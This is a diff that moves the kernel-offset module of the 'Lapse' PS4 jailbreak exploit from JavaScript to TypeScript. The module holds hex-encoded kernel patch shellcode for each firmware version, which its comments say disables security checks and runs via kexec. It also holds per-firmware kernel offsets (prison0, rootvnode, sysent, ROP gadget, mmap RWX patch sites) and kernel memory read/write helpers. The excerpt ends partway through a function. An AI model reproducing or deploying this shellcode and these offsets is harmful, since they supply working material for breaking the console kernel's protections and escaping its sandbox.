@@ -1,3 +1,6 @@
+/* eslint-disable no-void */
+import { BigInt, mem, fn, utils, syscalls } from 'download0/types'
+
 /** *** kernel_offset.js *****/
 
 // PS4 Kernel Offsets for Lapse exploit
@@ -5,7 +8,7 @@
 
 // Kernel patch shellcode (hex strings) - patches security checks in kernel
 // These are executed via kexec after jailbreak to enable full functionality
-var kpatch_shellcode = {
+const kpatch_shellcode = {
   '5.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb04000041b890e9ffff4881c2a0320100c681bd0a0000ebc6816da31e00ebc681b1a31e00ebc6812da41e00ebc68171a41e00ebc6810da61e00ebc6813daa1e00ebc681fdaa1e00ebc7819304000000000000c681c5040000eb668981bc0400006689b1b8040000c6817d4a0500eb6689b9f83a1a00664489812a7e2300c78150232b004831c0c3c68110d5130037c68113d5130037c78120c807010200000048899128c80701c7814cc80701010000000f20c0480d000001000f22c031c0c3',
   '5.03': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb04000041b890e9ffff4881c2a0320100c681bd0a0000ebc6817da41e00ebc681c1a41e00ebc6813da51e00ebc68181a51e00ebc6811da71e00ebc6814dab1e00ebc6810dac1e00ebc7819304000000000000c681c5040000eb668981bc0400006689b1b8040000c6817d4a0500eb6689b9083c1a00664489813a7f2300c78120262b004831c0c3c68120d6130037c68123d6130037c78120c807010200000048899128c80701c7814cc80701010000000f20c0480d000001000f22c031c0c3',
   '5.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2ccad0000c681ed0a0000ebc6810d594000ebc68151594000ebc681cd594000ebc681115a4000ebc681bd5b4000ebc6816d604000ebc6813d614000ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681cd070100eb6644898198ee0200664489890a390600c781300140004831c0c3c681d9253c0037c681dc253c0037c781d05e110102000000488991d85e1101c781fc5e1101010000000f20c0480d000001000f22c031c0c3',
@@ -29,43 +32,28 @@ var kpatch_shellcode = {
   '11.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be0500000066898151551200b8eb060000bf050000006689819355120041ba0100000048b84183bfa00400000041bb010000004889819b551200b804000000668981ad551200b8498bffffc781a9551200498b87d0c681af55120000c781b6551200498bb7b0668991ba551200c681bc55120000c781ce551200498b87406689b1d2551200c681d455120000c781db551200498bb7206689b9df551200c681e155120000c781f3551200498dbfc066448981f7551200c681f955120000c781ff551200498dbfe06644898903561200c6810556120000c78112561200498dbf006644899116561200c6811856120000c7811e561200498dbf206644899922561200c68124561200006689812f561200c68131561200ff0f20c0480d000001000f22c031c0c3',
   '12.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be0500000066898151551200b8eb060000bf050000006689819355120041ba0100000048b84183bfa00400000041bb010000004889819b551200b804000000668981ad551200b8498bffffc781a9551200498b87d0c681af55120000c781b6551200498bb7b0668991ba551200c681bc55120000c781ce551200498b87406689b1d2551200c681d455120000c781db551200498bb7206689b9df551200c681e155120000c781f3551200498dbfc066448981f7551200c681f955120000c781ff551200498dbfe06644898903561200c6810556120000c78112561200498dbf006644899116561200c6811856120000c7811e561200498dbf206644899922561200c68124561200006689812f561200c68131561200ff0f20c0480d000001000f22c031c0c3',
   '12.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689812cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900eb668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
-  '13.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689814cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900eb668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3'
-};
+  '13.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689814cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900eb668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
+}
 
 // Mmap RWX patch offsets per firmware (for verification)
 // These are the offsets where 0x33 is patched to 0x37
-var kpatch_mmap_offsets = {
+const kpatch_mmap_offsets: Record<string, [number, number]> = {
   // TODO: missing 5.00 to 8.50
-  '5.55': [0x3c2899, 0x3c289c],
-  // TODO: verify
-  '5.56': [0x24026d, 0x240270],
-  // TODO: verify
-  '6.00': [0x24026d, 0x240270],
-  // TODO: verify
-  '6.20': [0x24026d, 0x240270],
-  // TODO: verify
-  '6.50': [0xab57a, 0xab57d],
-  // TODO: verify
-  '6.70': [0xab57a, 0xab57d],
-  // TODO: verify
-  '7.00': [0x1d2336, 0x1d2339],
-  // TODO: verify
-  '7.50': [0xdb17d, 0xdb180],
-  // TODO: verify
-  '8.00': [0xfd03a, 0xfd03d],
-  // TODO: verify
-  '8.50': [0x826ea, 0x826ed],
-  // TODO: verify
-  '9.00': [0x16632a, 0x16632d],
-  // TODO: verify
-  '9.03': [0x1662da, 0x1662dd],
-  // TODO: verify
-  '9.50': [0x122d7a, 0x122d7d],
-  // TODO: verify
-  '10.00': [0xed59a, 0xed59d],
-  // TODO: verify
-  '10.50': [0x19c42a, 0x19c42d],
-  // TODO: verify
+  '5.55': [0x3c2899, 0x3c289c],   // TODO: verify
+  '5.56': [0x24026d, 0x240270],   // TODO: verify
+  '6.00': [0x24026d, 0x240270],   // TODO: verify
+  '6.20': [0x24026d, 0x240270],   // TODO: verify
+  '6.50': [0xab57a, 0xab57d],     // TODO: verify
+  '6.70': [0xab57a, 0xab57d],     // TODO: verify
+  '7.00': [0x1d2336, 0x1d2339],   // TODO: verify
+  '7.50': [0xdb17d, 0xdb180],     // TODO: verify
+  '8.00': [0xfd03a, 0xfd03d],     // TODO: verify
+  '8.50': [0x826ea, 0x826ed],     // TODO: verify
+  '9.00': [0x16632a, 0x16632d],   // TODO: verify
+  '9.03': [0x1662da, 0x1662dd],   // TODO: verify
+  '9.50': [0x122d7a, 0x122d7d],   // TODO: verify
+  '10.00': [0xed59a, 0xed59d],    // TODO: verify
+  '10.50': [0x19c42a, 0x19c42d],  // TODO: verify
   '11.00': [0x15626a, 0x15626d],
   '11.02': [0x15628a, 0x15628d],
   '11.50': [0x1fa63a, 0x1fa63d],
@@ -73,9 +61,9 @@ var kpatch_mmap_offsets = {
   '12.50': [0x1fa75a, 0x1fa75d],
   '13.00': [0x1fa77a, 0x1fa77d],
   '13.02': [0x1fa78a, 0x1fa78d],
-  '13.04': [0x1fa78a, 0x1fa78d]
-};
-var shellcode_fw_map = {
+}
+
+const shellcode_fw_map = {
   '5.00': '5.00',
   '5.01': '5.00',
   '5.03': '5.03',
@@ -124,260 +112,282 @@ var shellcode_fw_map = {
   '12.50': '12.50',
   '12.52': '12.50',
   '13.00': '13.00',
-  '13.02': '13.00',
-  '13.04': '13.00'
-};
-function get_mmap_patch_offsets(fw_version) {
+}
+
+export function get_mmap_patch_offsets (fw_version: string): [number, number] | null {
   // Normalize version
-  var lookup = fw_version;
-  if (fw_version === '9.04') lookup = '9.03';else if (fw_version === '9.51' || fw_version === '9.60') lookup = '9.50';else if (fw_version === '10.01') lookup = '10.00';else if (fw_version === '10.70' || fw_version === '10.71') lookup = '10.50';else if (fw_version === '11.52') lookup = '11.50';else if (fw_version === '12.02') lookup = '12.00';else if (fw_version === '12.52') lookup = '12.50';else if (fw_version === '13.04') lookup = '13.02';
-  return kpatch_mmap_offsets[lookup] || null;
+  let lookup = fw_version
+  if (fw_version === '9.04') lookup = '9.03'
+  else if (fw_version === '9.51' || fw_version === '9.60') lookup = '9.50'
+  else if (fw_version === '10.01') lookup = '10.00'
+  else if (fw_version === '10.70' || fw_version === '10.71') lookup = '10.50'
+  else if (fw_version === '11.52') lookup = '11.50'
+  else if (fw_version === '12.02') lookup = '12.00'
+  else if (fw_version === '12.52') lookup = '12.50'
+  else if (fw_version === '13.04') lookup = '13.02'
+
+  return kpatch_mmap_offsets[lookup as keyof typeof kpatch_mmap_offsets] || null
 }
 
 // Helper to convert hex string to byte array
-function hexToBytes(hex) {
-  var bytes = [];
-  for (var i = 0; i < hex.length; i += 2) {
-    bytes.push(parseInt(hex.slice(i, i + 2), 16));
+function hexToBytes (hex: string) {
+  const bytes = []
+  for (let i = 0; i < hex.length; i += 2) {
+    bytes.push(parseInt(hex.slice(i, i + 2), 16))
   }
-  return bytes;
+  return bytes
 }
 
 // Get kernel patch shellcode for firmware version
-function get_kpatch_shellcode(fw_version) {
-  var hex = kpatch_shellcode[shellcode_fw_map[fw_version]];
+function get_kpatch_shellcode (fw_version: string) {
+  const hex = kpatch_shellcode[shellcode_fw_map[fw_version as keyof typeof shellcode_fw_map] as keyof typeof kpatch_shellcode]
   if (!hex) {
-    return null;
+    return null
   }
-  return hexToBytes(hex);
+  return hexToBytes(hex)
 }
 
 // Firmware-specific offsets for PS4
 
-var offset_ps4_5_00 = {
-  // AND 5.01
+const offset_ps4_5_00 = {             // AND 5.01
   EVF_OFFSET: 0X7B3ED4,
   PRISON0: 0X10986A0,
   ROOTVNODE: 0X22C19F0,
   SYSENT_661: 0X1084200,
   JMP_RSI_GADGET: 0X13460
-};
-var offset_ps4_5_03 = {
+}
+
+const offset_ps4_5_03 = {
   EVF_OFFSET: 0X7B42E4,
   PRISON0: 0X10986A0,
   ROOTVNODE: 0X22C1A70,
   SYSENT_661: 0X1084200,
   JMP_RSI_GADGET: 0X13460
-};
-var offset_ps4_5_05 = {
-  // AND 5.07
+}
+
+const offset_ps4_5_05 = {             // AND 5.07
   EVF_OFFSET: 0X7B42A4,
   PRISON0: 0X10986A0,
   ROOTVNODE: 0X22C1A70,
   SYSENT_661: 0X1084200,
   JMP_RSI_GADGET: 0X13460
-};
-var offset_ps4_5_50 = {
+}
+
+const offset_ps4_5_50 = {
   EVF_OFFSET: 0X80EF12,
   PRISON0: 0X1134180,
   ROOTVNODE: 0X22EF570,
   SYSENT_661: 0X111D8B0,
   JMP_RSI_GADGET: 0XAF8C
-};
-var offset_ps4_5_53 = {
+}
+
+const offset_ps4_5_53 = {
   EVF_OFFSET: 0X80EDE2,
   PRISON0: 0X1134180,
   ROOTVNODE: 0X22EF570,
   SYSENT_661: 0X111D8B0,
   JMP_RSI_GADGET: 0XAF8C
-};
-var offset_ps4_5_55 = {
+}
+
+const offset_ps4_5_55 = {
   EVF_OFFSET: 0X80F482,
   PRISON0: 0X1139180,
   ROOTVNODE: 0X22F3570,
   SYSENT_661: 0X11228B0,
   JMP_RSI_GADGET: 0XAF8C
-};
-var offset_ps4_5_56 = {
+}
+
+const offset_ps4_5_56 = {
   EVF_OFFSET: 0X7C8971,
   PRISON0: 0X1139180,
   ROOTVNODE: 0X22F3570,
   SYSENT_661: 0X1123130,
   JMP_RSI_GADGET: 0X3F0C9
-};
-var offset_ps4_6_00 = {
-  // AND 6.02
+}
+
+const offset_ps4_6_00 = {             // AND 6.02
   EVF_OFFSET: 0X7C8971,
   PRISON0: 0X1139458,
   ROOTVNODE: 0X21BFAC0,
   SYSENT_661: 0X1123130,
   JMP_RSI_GADGET: 0X3F0C9
-};
-var offset_ps4_6_20 = {
+}
+
+const offset_ps4_6_20 = {
   EVF_OFFSET: 0X7C8E31,
   PRISON0: 0X113D458,
   ROOTVNODE: 0X21C3AC0,
   SYSENT_661: 0X1127130,
   JMP_RSI_GADGET: 0X2BE6E
-};
-var offset_ps4_6_50 = {
+}
+
+const offset_ps4_6_50 = {
   EVF_OFFSET: 0X7C6019,
   PRISON0: 0X113D4F8,
   ROOTVNODE: 0X2300320,
   SYSENT_661: 0X1124BF0,
   JMP_RSI_GADGET: 0X15A50D
-};
-var offset_ps4_6_51 = {
+}
+
+const offset_ps4_6_51 = {
   EVF_OFFSET: 0X7C6099,
   PRISON0: 0X113D4F8,
   ROOTVNODE: 0X2300320,
   SYSENT_661: 0X1124BF0,
   JMP_RSI_GADGET: 0X15A50D
-};
-var offset_ps4_6_70 = {
-  // AND 6.71, 6.72
+}
+
+const offset_ps4_6_70 = {             // AND 6.71, 6.72
   EVF_OFFSET: 0X7C7829,
   PRISON0: 0X113E518,
   ROOTVNODE: 0X2300320,
   SYSENT_661: 0X1125BF0,
   JMP_RSI_GADGET: 0X9D11D
-};
-var offset_ps4_7_00 = {
-  // AND 7.01, 7.02
+}
+
+const offset_ps4_7_00 = {             // AND 7.01, 7.02
   EVF_OFFSET: 0X7F92CB,
   PRISON0: 0X113E398,
   ROOTVNODE: 0X22C5750,
   SYSENT_661: 0X112D250,
   JMP_RSI_GADGET: 0X6B192
-};
-var offset_ps4_7_50 = {
+}
+
+const offset_ps4_7_50 = {
   EVF_OFFSET: 0X79A92E,
   PRISON0: 0X113B728,
   ROOTVNODE: 0X1B463E0,
   SYSENT_661: 0X1129F30,
   JMP_RSI_GADGET: 0X1F842
-};
-var offset_ps4_7_51 = {
-  // AND 7.55
+}
+
+const offset_ps4_7_51 = {             // AND 7.55
   EVF_OFFSET: 0X79A96E,
   PRISON0: 0X113B728,
   ROOTVNODE: 0X1B463E0,
   SYSENT_661: 0X1129F30,
   JMP_RSI_GADGET: 0X1F842
-};
-var offset_ps4_8_00 = {
-  // AND 8.01, 8.02, 8.03
+}
+
+const offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
   EVF_OFFSET: 0X7EDCFF,
   PRISON0: 0X111A7D0,
   ROOTVNODE: 0X1B8C730,
   SYSENT_661: 0X11040C0,
   JMP_RSI_GADGET: 0XE629C
-};
-var offset_ps4_8_50 = {
-  // AND 8.52
+}
+
+const offset_ps4_8_50 = {             // AND 8.52
   EVF_OFFSET: 0X7DA91C,
   PRISON0: 0X111A8F0,
   ROOTVNODE: 0X1C66150,
   SYSENT_661: 0X11041B0,
   JMP_RSI_GADGET: 0XC810D
-};
-var offset_ps4_9_00 = {
+}
+
+const offset_ps4_9_00 = {
   EVF_OFFSET: 0x7F6F27,
   PRISON0: 0x111F870,
   ROOTVNODE: 0x21EFF20,
   TARGET_ID_OFFSET: 0x221688D,
   SYSENT_661: 0x1107F00,
   JMP_RSI_GADGET: 0x4C7AD,
-  KL_LOCK: 0x3977F0
-};
-var offset_ps4_9_03 = {
+  KL_LOCK: 0x3977F0,
+
+}
+
+const offset_ps4_9_03 = {
   EVF_OFFSET: 0x7F4CE7,
   PRISON0: 0x111B840,
   ROOTVNODE: 0x21EBF20,
   TARGET_ID_OFFSET: 0x221288D,
   SYSENT_661: 0x1103F00,
   JMP_RSI_GADGET: 0x5325B,
-  KL_LOCK: 0x3959F0
-};
-var offset_ps4_9_50 = {
+  KL_LOCK: 0x3959F0,
+}
+
+const offset_ps4_9_50 = {
   EVF_OFFSET: 0x769A88,
   PRISON0: 0x11137D0,
   ROOTVNODE: 0x21A6C30,
   TARGET_ID_OFFSET: 0x221A40D,
   SYSENT_661: 0x1100EE0,
   JMP_RSI_GADGET: 0x15A6D,
-  KL_LOCK: 0x85EE0
-};
-var offset_ps4_10_00 = {
+  KL_LOCK: 0x85EE0,
+}
+
+const offset_ps4_10_00 = {
   EVF_OFFSET: 0x7B5133,
   PRISON0: 0x111B8B0,
   ROOTVNODE: 0x1B25BD0,
   TARGET_ID_OFFSET: 0x1B9E08D,
   SYSENT_661: 0x110A980,
   JMP_RSI_GADGET: 0x68B1,
-  KL_LOCK: 0x45B10
-};
-var offset_ps4_10_50 = {
+  KL_LOCK: 0x45B10,
+}
+
+const offset_ps4_10_50 = {
   EVF_OFFSET: 0x7A7B14,
   PRISON0: 0x111B910,
   ROOTVNODE: 0x1BF81F0,
   TARGET_ID_OFFSET: 0x1BE460D,
   SYSENT_661: 0x110A5B0,
   JMP_RSI_GADGET: 0x50DED,
-  KL_LOCK: 0x25E330
-};
-var offset_ps4_11_00 = {
+  KL_LOCK: 0x25E330,
+}
+
+const offset_ps4_11_00 = {
   EVF_OFFSET: 0x7FC26F,
   PRISON0: 0x111F830,
   ROOTVNODE: 0x2116640,
   TARGET_ID_OFFSET: 0x221C60D,
   SYSENT_661: 0x1109350,
   JMP_RSI_GADGET: 0x71A21,
-  KL_LOCK: 0x58F10
-};
-var offset_ps4_11_02 = {
+  KL_LOCK: 0x58F10,
+}
+
+const offset_ps4_11_02 = {
   EVF_OFFSET: 0x7FC22F,
   PRISON0: 0x111F830,
   ROOTVNODE: 0x2116640,
   TARGET_ID_OFFSET: 0x221C60D,
   SYSENT_661: 0x1109350,
   JMP_RSI_GADGET: 0x71A21,
-  KL_LOCK: 0x58F10
-};
-var offset_ps4_11_50 = {
+  KL_LOCK: 0x58F10,
+}
+
+const offset_ps4_11_50 = {
   EVF_OFFSET: 0x784318,
   PRISON0: 0x111FA18,
   ROOTVNODE: 0x2136E90,
   TARGET_ID_OFFSET: 0x21CC60D,
   SYSENT_661: 0x110A760,
   JMP_RSI_GADGET: 0x704D5,
-  KL_LOCK: 0xE6C20
-};
-var offset_ps4_12_00 = {
-  // AND 12.02
+  KL_LOCK: 0xE6C20,
+}
+
+const offset_ps4_12_00 = {            // AND 12.02
   EVF_OFFSET: 0x784798,
   PRISON0: 0x111FA18,
   ROOTVNODE: 0x2136E90,
   TARGET_ID_OFFSET: 0x21CC60D,
   SYSENT_661: 0x110A760,
   JMP_RSI_GADGET: 0x47B31,
-  KL_LOCK: 0xE6C20
-};
-var offset_ps4_12_50 = {
-  // AND 12.52, 13.00
-  EVF_OFFSET: 0x0,
-  // Missing but not needed in netctrl
+  KL_LOCK: 0xE6C20,
+}
+
+const offset_ps4_12_50 = {        // AND 12.52, 13.00
+  EVF_OFFSET: 0x0,        // Missing but not needed in netctrl
   PRISON0: 0x111FA18,
   ROOTVNODE: 0x2136E90,
-  TARGET_ID_OFFSET: 0x0,
-  // Missing but not needed in netctrl
+  TARGET_ID_OFFSET: 0x0,  // Missing but not needed in netctrl
   SYSENT_661: 0x110A760,
   JMP_RSI_GADGET: 0x47B31,
-  KL_LOCK: 0xE6C20
-};
+  KL_LOCK: 0xE6C20,
+}
 
 // Map firmware versions to offset objects
-var ps4_kernel_offset_list = {
+export const ps4_kernel_offset_list = {
   '5.00': offset_ps4_5_00,
   '5.01': offset_ps4_5_00,
   '5.03': offset_ps4_5_03,
@@ -427,234 +437,290 @@ var ps4_kernel_offset_list = {
   '12.50': offset_ps4_12_50,
   '12.52': offset_ps4_12_50,
   '13.00': offset_ps4_12_50,
-  '13.02': offset_ps4_12_50,
-  '13.04': offset_ps4_12_50
-  
-};
-var kernel_offset = null; // Global
+}
 
-function get_kernel_offset(FW_VERSION) {
-  var fw_offsets = ps4_kernel_offset_list[FW_VERSION];
+let kernel_offset: (typeof ps4_kernel_offset_list[keyof typeof ps4_kernel_offset_list]) & {
+  PROC_FD?: number,
+  PROC_PID?: number,
+  PROC_VM_SPACE?: number,
+  PROC_UCRED?: number,
+  PROC_COMM?: number,
+  PROC_SYSENT?: number,
+  FILEDESC_OFILES?: number,
+  SIZEOF_OFILES?: number,
+  VMSPACE_VM_PMAP?: number,
+  PMAP_CR3?: number,
+  SO_PCB?: number,
+  INPCB_PKTOPTS?: number,
+  IP6PO_TCLASS?: number,
+  IP6PO_RTHDR?: number,
+} | null = null // Global
+
+export function get_kernel_offset (FW_VERSION: string) {
+  const fw_offsets = ps4_kernel_offset_list[FW_VERSION as keyof typeof ps4_kernel_offset_list]
+
   if (!fw_offsets) {
-    throw new Error('Unsupported PS4 firmware version: ' + FW_VERSION);
+    throw new Error('Unsupported PS4 firmware version: ' + FW_VERSION)
   }
-  kernel_offset = fw_offsets;
+
+  kernel_offset = fw_offsets
 
   // PS4-specific proc structure offsets
-  kernel_offset.PROC_FD = 0x48;
-  kernel_offset.PROC_PID = 0xB0; // PS4 = 0xB0, PS5 = 0xBC
-  kernel_offset.PROC_VM_SPACE = 0x200;
-  kernel_offset.PROC_UCRED = 0x40;
-  kernel_offset.PROC_COMM = -1; // Found dynamically
-  kernel_offset.PROC_SYSENT = -1; // Found dynamically
+  kernel_offset.PROC_FD = 0x48
+  kernel_offset.PROC_PID = 0xB0       // PS4 = 0xB0, PS5 = 0xBC
+  kernel_offset.PROC_VM_SPACE = 0x200
+  kernel_offset.PROC_UCRED = 0x40
+  kernel_offset.PROC_COMM = -1        // Found dynamically
+  kernel_offset.PROC_SYSENT = -1      // Found dynamically
 
   // filedesc - PS4 different from PS5
-  kernel_offset.FILEDESC_OFILES = 0x0; // PS4 = 0x0, PS5 = 0x8
-  kernel_offset.SIZEOF_OFILES = 0x8; // PS4 = 0x8, PS5 = 0x30
+  kernel_offset.FILEDESC_OFILES = 0x0  // PS4 = 0x0, PS5 = 0x8
+  kernel_offset.SIZEOF_OFILES = 0x8    // PS4 = 0x8, PS5 = 0x30
 
   // vmspace structure
-  kernel_offset.VMSPACE_VM_PMAP = -1;
+  kernel_offset.VMSPACE_VM_PMAP = -1
 
   // pmap structure
-  kernel_offset.PMAP_CR3 = 0x28;
+  kernel_offset.PMAP_CR3 = 0x28
 
   // socket/net - PS4 specific
-  kernel_offset.SO_PCB = 0x18;
-  kernel_offset.INPCB_PKTOPTS = 0x118; // PS4 = 0x118, PS5 = 0x120
+  kernel_offset.SO_PCB = 0x18
+  kernel_offset.INPCB_PKTOPTS = 0x118  // PS4 = 0x118, PS5 = 0x120
 
   // pktopts structure - PS4 specific
-  kernel_offset.IP6PO_TCLASS = 0xB0; // PS4 = 0xB0, PS5 = 0xC0
-  kernel_offset.IP6PO_RTHDR = 0x68; // PS4 = 0x68, PS5 = 0x70
+  kernel_offset.IP6PO_TCLASS = 0xB0    // PS4 = 0xB0, PS5 = 0xC0
+  kernel_offset.IP6PO_RTHDR = 0x68     // PS4 = 0x68, PS5 = 0x70
 
-  return kernel_offset;
+  return kernel_offset
 }
 
 // Global kernel object to save information
 // Also used in lapse.js
 
-var kernel = {
+export const kernel: {
+  addr: {
+    base?: BigInt,
+    curproc?: BigInt,
+    allproc?: BigInt,
+    curproc_fd?: BigInt,
+    curproc_ofiles?: BigInt,
+    inside_kdata?: BigInt,
+  },
+  read_buffer: ((kaddr: BigInt, length: number) => Uint8Array | null) | null,
+  write_buffer: ((kaddr: BigInt, buffer: Uint8Array) => void) | null,
+  read_byte: (kaddr: BigInt) => number | null,
+  read_word: (kaddr: BigInt) => number | null,
+  read_dword: (kaddr: BigInt) => number | null,
+  read_qword: (kaddr: BigInt) => BigInt | null,
+  read_null_terminated_string: (kaddr: BigInt) => string,
+  write_byte: (dest: BigInt, value: number) => void,
+  write_word: (dest: BigInt, value: number) => void,
+  write_dword: (dest: BigInt, value: number) => void,
+  write_qword: (dest: BigInt, value: BigInt | number) => void,
+  copyout?: (kaddr: BigInt, uaddr: BigInt, len: BigInt) => void,
+  copyin?: (uaddr: BigInt, kaddr: BigInt, len: BigInt) => void
+} = {
   // Object used to sture kbase, curproc, allproc
   addr: {},
   // We need to define these 2 functions in the exploit
   read_buffer: null,
   write_buffer: null,
-  read_byte: function (kaddr) {
-    var _kernel$read_buffer;
-    var value = (_kernel$read_buffer = kernel.read_buffer) === null || _kernel$read_buffer === void 0 ? void 0 : _kernel$read_buffer.call(kernel, kaddr, 1);
-    return value && value.length === 1 ? value[0] : null;
+  read_byte: function (kaddr: BigInt) {
+    const value = kernel.read_buffer?.(kaddr, 1)
+    return value && value.length === 1 ? (value[0]!) : null
   },
-  read_word: function (kaddr) {
-    var _kernel$read_buffer2;
-    var value = (_kernel$read_buffer2 = kernel.read_buffer) === null || _kernel$read_buffer2 === void 0 ? void 0 : _kernel$read_buffer2.call(kernel, kaddr, 2);
-    if (!value || value.length !== 2) return null;
-    return value[0] | value[1] << 8;
+  read_word: function (kaddr: BigInt) {
+    const value = kernel.read_buffer?.(kaddr, 2)
+    if (!value || value.length !== 2) return null
+    return (value[0]!) | ((value[1]!) << 8)
   },
-  read_dword: function (kaddr) {
-    var _kernel$read_buffer3;
-    var value = (_kernel$read_buffer3 = kernel.read_buffer) === null || _kernel$read_buffer3 === void 0 ? void 0 : _kernel$read_buffer3.call(kernel, kaddr, 4);
-    if (!value || value.length !== 4) return null;
-    var result = 0;
-    for (var i = 0; i < 4; i++) {
-      result |= value[i] << i * 8;
+  read_dword: function (kaddr: BigInt) {
+    const value = kernel.read_buffer?.(kaddr, 4)
+    if (!value || value.length !== 4) return null
+    let result = 0
+    for (let i = 0; i < 4; i++) {
+      result |= ((value[i]!) << (i * 8))
     }
-    return result;
+    return result
   },
-  read_qword: function (kaddr) {
-    var _kernel$read_buffer4;
-    var value = (_kernel$read_buffer4 = kernel.read_buffer) === null || _kernel$read_buffer4 === void 0 ? void 0 : _kernel$read_buffer4.call(kernel, kaddr, 8);
-    if (!value || value.length !== 8) return null;
-    var result_hi = 0;
-    var result_low = 0;
-    for (var i = 0; i < 4; i++) {
-      result_hi |= value[i + 4] << i * 8;
-      result_low |= value[i] << i * 8;
+  read_qword: function (kaddr: BigInt) {
+    const value = kernel.read_buffer?.(kaddr, 8)
+    if (!value || value.length !== 8) return null
+    let result_hi = 0
+    let result_low = 0
+    for (let i = 0; i < 4; i++) {
+      result_hi |= ((value[i + 4]!) << (i * 8))
+      result_low |= ((value[i]!) << (i * 8))
     }
-    var result = new BigInt(result_hi, result_low);
-    return result;
+    const result = new BigInt(result_hi, result_low)
+    return result
   },
-  read_null_terminated_string: function (kaddr) {
-    var result = '';
+  read_null_terminated_string: function (kaddr: BigInt) {
+    let result = ''
+
     while (true) {
-      var _kernel$read_buffer5;
-      var chunk = (_kernel$read_buffer5 = kernel.read_buffer) === null || _kernel$read_buffer5 === void 0 ? void 0 : _kernel$read_buffer5.call(kernel, kaddr, 0x8);
-      if (!chunk || chunk.length === 0) break;
-      var null_pos = -1;
-      for (var i = 0; i < chunk.length; i++) {
+      const chunk = kernel.read_buffer?.(kaddr, 0x8)
+      if (!chunk || chunk.length === 0) break
+
+      let null_pos = -1
+      for (let i = 0; i < chunk.length; i++) {
         if (chunk[i] === 0) {
-          null_pos = i;
-          break;
+          null_pos = i
+          break
         }
       }
+
       if (null_pos >= 0) {
         if (null_pos > 0) {
-          for (var _i = 0; _i < null_pos; _i++) {
-            result += String.fromCharCode(Number(chunk[_i]));
+          for (let i = 0; i < null_pos; i++) {
+            result += String.fromCharCode(Number(chunk[i]))
           }
         }
-        return result;
+        return result
       }
-      for (var _i2 = 0; _i2 < chunk.length; _i2++) {
-        result += String.fromCharCode(Number(chunk[_i2]));
+
+      for (let i = 0; i < chunk.length; i++) {
+        result += String.fromCharCode(Number(chunk[i]))
       }
-      kaddr = kaddr.add(chunk.length);
+
+      kaddr = kaddr.add(chunk.length)
     }
-    return result;
+
+    return result
   },
-  write_byte: function (dest, value) {
-    var _kernel$write_buffer;
-    var buf = new Uint8Array(1);
-    buf[0] = Number(value & 0xFF);
